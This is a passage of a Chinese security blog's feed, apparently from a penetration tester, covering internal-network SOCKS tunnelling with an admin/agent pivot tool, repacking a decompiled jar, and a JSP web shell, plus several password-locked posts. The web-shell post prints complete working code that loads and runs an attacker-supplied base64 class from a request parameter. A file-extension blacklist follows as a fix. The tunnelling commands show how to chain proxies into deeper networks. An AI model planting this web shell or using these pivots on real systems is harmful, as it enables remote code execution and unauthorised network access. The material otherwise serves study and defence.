class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">-l 被动模式下的监听地址[ip]:&lt;port&gt;<br><br>-s 节点通信加密密钥<br><br>-c 主动模式下的目标节点地址<br><br>--proxy socks5代理服务器地址<br><br>--proxyu socks5代理服务器用户名(可选)<br><br>--proxyp socks5代理服务器密码(可选)<br><br>--reconnect 重连时间间隔（s）<br><br>--rehost 端口复用时复用的IP地址<br><br>--report 端口复用时复用的端口号<br><br>--up 上游协议类型,默认为裸TCP流量,可选HTTP<br><br>--down 下游协议类型,默认为裸TCP流量,可选HTTP<br><br>--cs 运行平台的shell编码类型，默认为utf-8，可选gbk<br></code></pre></td></tr></table></figure><h3 id="单层隧道搭建"><a href="#单层隧道搭建" class="headerlink" title="单层隧道搭建"></a>单层隧道搭建</h3><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250318003401221.png" alt="image-20250318003401221"></p><p>控制端配置</p><p>windows使用被动模式，监听端口8000，并对通信进行加密秘钥为123。等待被控端的连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">windows_x64_admin.exe -l 192.168.125.134:8000 -s 123 <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">windows_x64_admin.exe -l 8000 -s 123  <span class="hljs-comment">#或者不指定ip默认监听0.0.0.0</span><br></code></pre></td></tr></table></figure><p>被控端配置</p><p>在可控linux上执行，使用秘钥123连接控制端8000端口，并设置重连间隔时间，当控制端掉线时客户端每隔8s重连控制端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./linux_x64_agent -c 192.168.125.134:8000 -s 123 --reconnect 8<br></code></pre></td></tr></table></figure><p>此时客户端与控制端间搭建了一条socks隧道。</p><p>此时，admin端就可以控制</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314000539830.png" alt="image-20250314000539830"></p><p>可以看到detail有一个节点</p><p>我们使用这个节点<code>use 0</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314000649868.png" alt="image-20250314000649868"></p><p>建立socks隧道</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314001615923.png" alt="image-20250314001615923"></p><p>在windows使用proxifier创建代理</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314001732271.png" alt="image-20250314001732271"></p><p>创建代理规则</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314003554392.png" alt="image-20250314003554392"></p><p>目标ip填目标靶机地址</p><p>在linux使用proxychains创建代理</p><p>我们需要修改&#x2F;etc&#x2F;proxychains4.conf </p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314002529186.png" alt="image-20250314002529186"></p><p>修改成指定端口(这里是windows做admin就不演示)</p><p>成功访问内网</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314002917468.png" alt="image-20250314002917468"></p><h3 id="多层隧道搭建"><a href="#多层隧道搭建" class="headerlink" title="多层隧道搭建"></a>多层隧道搭建</h3><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250318003945521.png" alt="image-20250318003945521"></p><p>在单层的基础上我们<code>use 0</code>之后继续使用监听</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314003137910.png" alt="image-20250314003137910"></p><p>模式选择普通模式1,2是iptables 重用模式，仅限linux，3是复用socks模式，这里没必要，要是是docker容器限制端口可以使用3</p><p>继续在深层内网机器主动连接我们的10000端口</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./linux_x64_agent</span> -c ip<span class="hljs-function">:10000</span> -s 123 <span class="hljs-params">--reconnect</span> 8<br></code></pre></td></tr></table></figure><p>此时我们的admin又会上线二级代理机器，没环境就不复现了</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314004057422.png" alt="image-20250314004057422"></p><p>我们<code>use 1</code>在创建socks</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314004135114.png" alt="image-20250314004135114"></p><p>这是我们的widows就可以访问深层内网了在效仿<code>node0</code>配置代理就行</p><p>多级代理就可以了，速度稳定性都还可以</p><p>ps：图片来自网络，写的不好大佬轻点喷</p>]]></content>
    
    
    <categories>
      
      <category>内网代理搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网代理搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jar反编译重新打包</title>
    <link href="/2025/03/16/jar%E5%8F%8D%E7%BC%96%E8%AF%91%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85/"/>
    <url>/2025/03/16/jar%E5%8F%8D%E7%BC%96%E8%AF%91%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h1 id="java反编译jar包并修改class文件重新打包"><a href="#java反编译jar包并修改class文件重新打包" class="headerlink" title="java反编译jar包并修改class文件重新打包"></a>java反编译jar包并修改class文件重新打包</h1><p>手写个简单的javademo</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250316000901953.png" alt="image-20250316000901953"></p><p>添加工件</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250316000927506.png" alt="image-20250316000927506"></p><p>构建jar包</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250316001012430.png" alt="image-20250316001012430"></p><p>使用jadx打开导出文件</p><p>修改要改的java包</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250316001753701.png" alt="image-20250316001753701"></p><p>使用</p><p>javac重新编译加上java的配置文件生成class文件</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">javac -classpath 配置文件 java文件<br><br>javac -classpath <span class="hljs-name">C</span>:\Users\xp\Downloads\<span class="hljs-number">4</span>\resources\META-INF\MANIFEST.MF ./Main.java<br></code></pre></td></tr></table></figure><p>解压jar包用编译的class覆盖原来的class</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jar </span>-xvf Main.<span class="hljs-keyword">jar </span><br></code></pre></td></tr></table></figure><p>打包jar</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">jar -cvfm 打包的jar名 配置文件 打包内容 <br>jar -cvfm Demo.jar <span class="hljs-keyword">META</span>-<span class="hljs-keyword">INF</span>/MANIFEST.MF Main.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>jar反编译重新打包</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jsp一句话木马</title>
    <link href="/2025/03/15/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    <url>/2025/03/15/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;%!<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">ClassLoader</span> &#123;<br>        <span class="hljs-title function_">U</span>(<span class="hljs-params">ClassLoader c</span>) &#123;<br>            <span class="hljs-variable language_">super</span>(c);<br>        &#125;<br>        public <span class="hljs-title class_">Class</span> <span class="hljs-title function_">g</span>(<span class="hljs-params">byte[] b</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">defineClass</span>(b, <span class="hljs-number">0</span>, b.<span class="hljs-property">length</span>);<br>        &#125;<br>    &#125;<br> <br>    public byte[] <span class="hljs-title function_">base64Decode</span>(<span class="hljs-title class_">String</span> str) throws <span class="hljs-title class_">Exception</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-title class_">Class</span> clazz = <span class="hljs-title class_">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);<br>            <span class="hljs-keyword">return</span> (byte[]) clazz.<span class="hljs-title function_">getMethod</span>(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, <span class="hljs-title class_">String</span>.<span class="hljs-property">class</span>).<span class="hljs-title function_">invoke</span>(clazz.<span class="hljs-title function_">newInstance</span>(), str);<br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123;<br>            <span class="hljs-title class_">Class</span> clazz = <span class="hljs-title class_">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            <span class="hljs-title class_">Object</span> decoder = clazz.<span class="hljs-title function_">getMethod</span>(<span class="hljs-string">&quot;getDecoder&quot;</span>).<span class="hljs-title function_">invoke</span>(<span class="hljs-literal">null</span>);<br>            <span class="hljs-keyword">return</span> (byte[]) decoder.<span class="hljs-title function_">getClass</span>().<span class="hljs-title function_">getMethod</span>(<span class="hljs-string">&quot;decode&quot;</span>, <span class="hljs-title class_">String</span>.<span class="hljs-property">class</span>).<span class="hljs-title function_">invoke</span>(decoder, str);<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-title class_">String</span> cls = request.<span class="hljs-title function_">getParameter</span>(<span class="hljs-string">&quot;passwd&quot;</span>);<br>    <span class="hljs-keyword">if</span> (cls != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title function_">U</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getClass</span>().<span class="hljs-title function_">getClassLoader</span>()).<span class="hljs-title function_">g</span>(<span class="hljs-title function_">base64Decode</span>(cls)).<span class="hljs-title function_">newInstance</span>().<span class="hljs-title function_">equals</span>(pageContext);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>修复建议加上waf函数</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span>[] BLACKLIST_EXTENSIONS = &#123;<span class="hljs-string">&quot;.jsp&quot;</span>, <span class="hljs-string">&quot;.jspx&quot;</span>, <span class="hljs-string">&quot;.jspf&quot;</span>, <span class="hljs-string">&quot;.jsw&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>&#125;;<br>...<br>        <span class="hljs-keyword">try</span> &#123;<br>            smartUpload.<span class="hljs-built_in">upload</span>();<br>            <span class="hljs-type">String</span> id = rq.<span class="hljs-built_in">getParameter</span>(<span class="hljs-string">&quot;id&quot;</span>);<br>            <span class="hljs-built_in">File</span> smartFile = smartUpload.<span class="hljs-built_in">getFiles</span>().<span class="hljs-built_in">getFile</span>(<span class="hljs-number">0</span>);<br>            <br>            <span class="hljs-comment">// 检查文件扩展名是否在黑名单中</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isExtensionAllowed</span>(smartFile.<span class="hljs-built_in">getFileName</span>())) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">IllegalArgumentException</span>(<span class="hljs-string">&quot;Fuck you ~&quot;</span>);<br>            &#125;<br>            <br>            smartFile.<span class="hljs-built_in">saveAs</span>(<span class="hljs-string">&quot;/userImg/&quot;</span> + smartFile.<span class="hljs-built_in">getFileName</span>().<span class="hljs-built_in">toString</span>());<br>            out.<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(\&quot;上传成功!\&quot;);window.location.href=&#x27;teacher/personal.jsp&#x27;;&lt;/script&gt;&quot;</span>);<br>        &#125; <span class="hljs-built_in">catch</span> (Exception var9) &#123;<br>            out.<span class="hljs-built_in">print</span>(var9);<br>        &#125;<br>...<br>...<br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title">isExtensionAllowed</span><span class="hljs-params">(<span class="hljs-type">String</span> fileName)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">String</span> extension : BLACKLIST_EXTENSIONS) &#123;<br>            <span class="hljs-keyword">if</span> (fileName.<span class="hljs-built_in">toLowerCase</span>().<span class="hljs-built_in">endsWith</span>(extension)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>...<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>jsp一句话木马</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>impacket工具集</title>
    <link href="/2025/03/14/impacket%E5%B7%A5%E5%85%B7%E9%9B%86/"/>
    <url>/2025/03/14/impacket%E5%B7%A5%E5%85%B7%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5745315566f6c847a85013d67100724eedfb486cd8bd7e3befae421b01be1786"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>impacket工具集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>impacket工具集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网小工具</title>
    <link href="/2025/03/13/%E5%86%85%E7%BD%91%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
    <url>/2025/03/13/%E5%86%85%E7%BD%91%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="56286c8aa3a53c548cb00101bf09de3bc2d664fe51a3362e81e924968354564e"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网小工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网小工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云境·网鼎杯半决赛</title>
    <link href="/2025/03/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/"/>
    <url>/2025/03/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="033a12965c55e469bb26e31d26054c6d9e2b7f7b3f889f2376d53674a5e32adf">7389a4e37e9dabc8af72228f567f583bb5a45bd0f3a6f097aaa03e2b7f93f5d0b20c91da5e32e4e84e546aeef279409a54627c0539008506b8ab0085e2e58a35767bf32b6a83da2b5862be2622b138229704720be65a316cc4a96c95dd02a220f5064179acc6f456a01304432a5bcf2b6fa07b7b5c066a59b535ddb083010db8c8399a20145c38f060f4c83fada3284231ec71e9fea27128ab3f93f0f169f326487101b53a953c693660b801b9e12ea820521f5041b285bdc1694cfdb704d7e19365f5e9371a41dcee19a419c1075b72622a4a29fb59db9eee23f6b5f6c6b1caad3f5abb707fd5a447533a098099bec2d00465bd3202624b53a8d008d6bf3b88ec47a1aba61b9694d8067eeab354b713e4610520832317496d8cf04d8f1399311c746e5aeb8660371ffdfe97676ef7db65184500da73ee483508f8b53ea58303faae944fd7529bc0062e8b712a1e69450029edefc56ced9be796853c1b2bf25f0ed272657065495e4b5908f0f0f4f4ca883a8128394a45fd7ca092d00ba7f071b73befba9221ca0b8f424f624291a177993b846a97a83b4570b04a1821d3032a9657183999c7a46e5c966eccac565f25c824035382cc0704b0fcfe2cae7ebd85b2031d9f9116eced8040afa03accd96d58d85604935320f8f7137e708033d6d7f85f6ea7ce0965d76d7365e54865c627c041157057545681bc464065d2b67bc5d8ed3a6ad9489f7933a610a7db48ef32ee793d3e32114b25f602400be093dc95d628081d23e067be46942fde7b8370e1f52867f353a04a8d0d1bbe91e74f3ab909be699812623078a21cb8fb5e905e829d830ce97da58ac3f73beeb6eec14180ea7a75be24db494c21b27d56c34ac04b98e544eb8414ce462ed433904f4d0b0fa2e3d8f562d21b5115e8c476c1925cc72fae043549499fc986f24ba57fb5c02ed6775aa19e8f8f36077f854b159969554eaa00ba8000fbfcde57a0d289ed06ec28ec32e457a8c5178c7c35ae94a486768b4a53dc2343fb4c0286b735720560408fbbb31ad3516d871c04b855e6c0c713c70ae9ddb85c5a9261d7d84ae4c363ba7f3ad9bf02d6c1ec4634c4cc57195955b07814c6f7d46c2b36180d5594fb91d3a9bef85b8b8e0ec72575978f2ae921968461eae15a122eb744ceb67522c18a14aac0976fda614691e34dbb84b1f34e20db90118f2d28e4c56df08ebcff04630f16ac4b6ed856566abd9377561af262830f38f8e03c49000e1a31baf8fd354f49a8f3dd599c7c8acc5f70f5d2577005e8976b8e0e2151c8325f6b4576fda7c4aa312c646ba9a34cdad608f63879759e6d627204aeca9b31093edb9705a54bfe945b7b9cc34beabeb0eeb78e6b2993fb41cfb6695c1ba83441a48448c5a043e9c0b16e9c0c8d2224fb5e896d1d19e9d4513eaf5a20d00aa506fb86942b7f81e9d02d0b7ba5c45444562ac18d32255e3a2fa9756f1db8544ec4a8c7260f3d508db2cfd92586f8c17c4b0c381866dfe2f30fd67838b52a93bdcbe379d5e07b6750e280d6736c4b77192c1778740f88ac7eeead505ae85818f2a186aa8dfe5052e7dd5ac798ea92e2fe8902c5777b166867df350a99c68dbdf04f167fedfcfb99377d885217acd03a2efd0d20eb051700ad408085849bb0f244fb4385babf52db7c299d254281fd26ff700a4dca3d7f364e858bd46cd1315533112a3fd385b16faa6bc10c1931b54ddd7c399a1ce8e5787e57d71517a8815179e4ffd693b557da289904f1c09186b464b76eede9278b3ff80f8a59e28ac2ff02e2e19c90fca495af80c118c2422052565969db638c69541f65962ba97a44d761c69d37afee2e3596f2e7a85b850582e515cff396475d10d62811ca2d89dcc471ec880eec3be8da1a6445caf29e29715e32f7751a4d10309a2d6da17acae6aff38c67c864134343f266fe1a42fc94b627b6b188ec7ecb0c906acb84bce4c8e21574526bca586ea32343f5cc928a1963aca43afe0514fde89808ed0f8f7a1d5a505c087cb6c1333fa30af09043409f7392f4fc5ab4a6cbe513817e9433f11e58aef84088f3427e9433e0c4ebb99116fb324bc72fee32c34df99e6a9e7b27201a06cdff50d9001ffb8c697b69dbb791327cbff0e4e1a0fca24288208192f7bde3bad4c32d4075f3ef65f9c3130d354aa3f124ff10eb02024764ac1dbdcf85d48e6d3ff1fec6775aea42ddb2efa7cfc3b6f7e043857f772d19550e00dfa5360d689b5306ac102d67a32bf53576ffa479f4aff1e64ffa0982f376a77bbe63b153147a46c7d17523d0f882a7a90303cdef4781614f2ef96b71710f55f28a0e0c6fe605a3848dbdebba6bb35b85814b02660485a7e1c55dfbe121861e1eb60decb0ba1ed9b2cc2c384de9385dc02c04e0266d3ff74345dda25b475bcb994db4e988c0275fdb4d990e1bdea2bf48aba468deb01c254dccd0aa4eb05f13464793f5190a93398f0c6056ccf7f43a5e652030439552afcd498d1e1124e681c97319633c59d337f1a2b2dca4e3d73a14edf2e1b64c2c5ea19b28fee810ad9a356b390f8cf0690d70ef1468f6eea994283116f8010a85068bd4279924549315b3332b1047e7b63ef7417b0b4e46a3a97e3dc7db36c70c191f78d75e930f36080a9c6505907b5f54e3b86d0e43b1b4a7ca3d1930d3fcd7f12f78b93ec81ae6c02d593826e1107e237d594f908213565954107cb186b916abd66d8b99d38e817ac84ff3f5ad28802c891f15fc8ec7612ab932e74d580919f58bce84d60ed8e9d68b3673f535cf11bfc1ed5581e56b1bb3d40fe512abdfc0b2cf423c3378a46e8d1ad2431e95ca27d27dbfd30dde07142868c5ef30bd4c6cce334da33ad27fa65b641b626377ad1b521779e9f955f4233f505278ea777c4ac7fb2702837dbde9af105adeb3a374c98e9e49a90bcc350b2f54ade86da3745b23aca06bcc8f82c29760886c2223f9323d100f7f1c2db9a84feb456e6c92cb09951b6429e1516c7f1754e6442d22607f1527bc21f83b3adba948ed5307ae79490d94c82dfe14da9147015422616b5c891d377aed77857102170cb062aed1ebfea94d40202bbbf51d0b77c9d399638b8a7385d7e900cc8110977b6a094128c07d34e9bb6e2dbeb593bc1cb1aba7e084a0f980c268a488011883854c247c734bbe29f76bc921502a33b7561aca0edd7a77d92806f2a10cb5ed262d3e854230ace5bfa659e85d72d1081cd9e9183404b195397c9862e079052a709c73dca8a6e1da776f6a0c550d21669d767a3a4ee0e65fdbc239312be4d5f1098dc23ed56c1fe449cfad7a37082ca78c8e66ba883e923f6a543d166bf858a22e2366b0327b6564c363d233075586187baf32cba2807ff3f1b45e9a7f73f098c644442893db1cf1be0b0d155e9618553b3aabbcc45b97666792291ddf6ab32e00fedb8f0fe605254608c0c81d4ee807dec1dbbcaf9c6f4a9a38d1ec3ebb7e5cb34a0397522babd183d1ca89c7f358a9bef31967389885930150259d66ece1e7e3d50ace1b94a6a6fceba64a17e09bd5a5531bd580bf17f22d7201325f2b5d8ac0c122153b8db939c506d8e67e9dd00d749d8da093c94a6e0d3778a302ccaec4f9a49f9496d80aa6f41c6d550d7feffeb1e5b0ff005c94158fdd4c0f7b859bc81839b60f00c5adc6b6a220cb00759bbd765def349f588097963c4854b5d9472724de6a44da19e9e1c24cd0ace2f315821751aef80d2d3fc9b3ce55dd479e9aed027c3f403ad3a8ae081cd602935c7d56269f714be8afd7db2ec95ef4f15433bf7f9d2806e1e2edb466fef2c87e706b1fe3a4363ea0b27df9614f1a145c0f5b6cc529112870c9bf8e0af00f99b8df7c863d0807f6eafb8f74d327c3bf897d9f693f3dbe04b44b1cf95a7e9d552639dc2f391f9edd2b030db05763949e6ce9d468772491f4de9c5cedf1567e28d10ecec9daa038ed4ac56e0eeab5707a083784f0e1f7b7f25022c30d68e44d5b9136b4d6661941ce0e7205c264bcad6a0476d96cb2618d1ab086a1c5326a61a139399c43d8384dfec9d9c4b04cd1034e60327d8e80457dc9fb050dd421a99e7bfdd2e7f1ef2f3190dc48c9b0d537b74beebccb8c806f1a519b9801b9c6368b587bfa4d47286244eb860b70c2c24a88386fb93925b1c44bef857d0f0d02ddefe71ad45fbd2112dd6f80e87e3cf7a8be3fe39225c05143a7b51e6262c81427e430dc6c31d1d028c1c3b6bd62ddccac644ddc2e3626eb875a394a776b48ba2b5d94ee38dc69d0727033212d11155d458912bb11b03fb6b470d355320090530266d62d704e3fbd1fc9d42fe1b369c6a90c58dd1fe9607084e9682c99c0bd0bc2a3b9ec8863e2321138216e38f76e44efd7dc8fd21a024362ac0767e4be03a6855e1746a0be38a9a477e43d08e683e83c220f3fc08666a53c2e8ef30804b6503870a9d5c5114e94a42826514c5a4cc874a4c5693dd3c0413415f285cedb340d47809b0c5dfcc704788b8d075a73aceda12a925ea0b8a0e9476e899fcaa21503d6988bc82d087bee023c154179b35604bd99aa35edf56efc31c012435c89c7ab29a2cfdbd111209961bbc4aabaafed71fa2b07f6c4aae91b372c3fc70a5a80167285c3b64e4f5523035659a233db7f894827f842c67a4b174924595bd99ca1f67f9185854586623ae3e5dfcb9c0521452e118f83786be9a594c9037a8eda44511de7fba633e3610adde60c1aa411948286da45335db41c7cc4c43cedf980e924654af7fb6a66c5199f340456ebc1ef8a09032df49f7ec8b288861eeb59776f1b10b1166432b112c4480cd45a50e81e075e8e9675f3ad5226cf50b9783aa6571b3af2375c1cbdd4844243bfdf24804c8544f4af14980ccc8c966ff2e9d4661c0201abd6b7bf85c755f01b4631cc132b4b37ca2c906dd2e90e7f8362f4631e36340f4542ae3725c9fea34977fd43035e4d91103177fc479c865a44faa5c957a489f0e86f7d7523637726331f3ba2299afe9370d99f96cde5e65d3dc785c0934288cd1d1b54163177f52b8049db6277c400bf3f6fb5853e03869b570f8d9ada1a6691e1a7ddada02f369c31dda9231aa6a65a9b2cca08f8713127075b1f8918040dfab9ddee2da7b3787f26e1989e427db77593ac65d7449c4ced48387b7f3574a801f296ea9740d2f291c1d288a035032ac59270e576c83b4ad9c6138fbd851a527962fed4a8c06414303accb1e2422c452fab369d2de9f49b6958838b1194dbe6ce05cafb8e0b7591c2a978de1353b1e33313cde29035d411d66374c701f1433f7af7a92096e3f9bb7619228ed5cc4d70cbf7048a7fb83cbde8fdd4c11686b3c269ff3c6ae76c559acdf3097b2d032419140b6c219846a7954b70910e1bc80e4bd04f7a6e28415c71a3e7a9e6a493a4491f45929b3600bee357e88ae8e5a703a6549bdb0b9e6c85936beb02ef9d314e944165822f02f769c7f60ed09a8d098d45faceeca35726889e9a960d665627708b26a9bbfc98058ccc3d5290e29479b291b454198ad07f201ba359095766546a76f2886f8f58f048705ecb543b3f05fabccb24344fe9331e62af33a85b82dabbcdd47481f1f4176986f08c651b35ee5059e449ed2d47bdd9491fb8a5116ef3a2f20e16040b2929b06f5757f06b55de93667bc1533fa649ef917bc98cbe1d2086b23e8014c7769c815af20b8b031fc83730091df6dda16ebd0edcbd35591dbbb51741c86e0489af1a5f97ce3e1ba1e7e4c55f5ad2929ba1a8f9a74e34cd42020cb26b0da38414331e6cf0c8b4017014f76e8b0ddd90d3a8e59954d55d9f49bb645596eea7b17e97138ae2cde2c1879b1fff177d881681f541eca9f170f9c701a70f760c644c96e8fa2a0c860806866c062362ec449d545bc75718aa990a25fcf4f33f86b97e08faa2f2e264a5b5d601393366ebdd60476369df5044f93f87463c06dd435e19cd9adba5fc52fce8221fff8ab211cf4917ae215a94a5465b01f6d18deb3006fbcdef03fbe726f3a496fceefb12f074cac66f582f6d97dec6defeb583a81950cccc95e017f25e5866922a571fb4c0e8b747d92030446d5dc4922168e82d817cc163f9597114aa7ec0eb3b72abab311c29f3f9510007db3d2b6ec4df7aa9c2e2f08b0454103e3ad35fa2c0243d6165cfce3b8bff8b85881298b0bc5d691307371d792d3b888366f2f53913ff69b6c551b0a9dd95fb5104e60d16c97dde9b93fd58b3e7f7d8c50b70a58cea285661f354b44f2bd5f90b5760d2b70a35eda586395a637cdd52271b9fdbacdfb9503d62a58a19f887233dab13cec90cd20c865b8b2c5895caf9172aa096a2e5f6250a386081efe607d174c329f5881e13d41a171dc832427ee4a870dcfb9b1f2890c807e115365f441375f4d51556667dac3e670345a77f1df4e4d17196ce7813ed85150dcb96d6a2104e0715dd220c6cfd52a2605ad72868150b9b981d751b44868e4cd7f44e11e4f93a1b2d55e852542c353d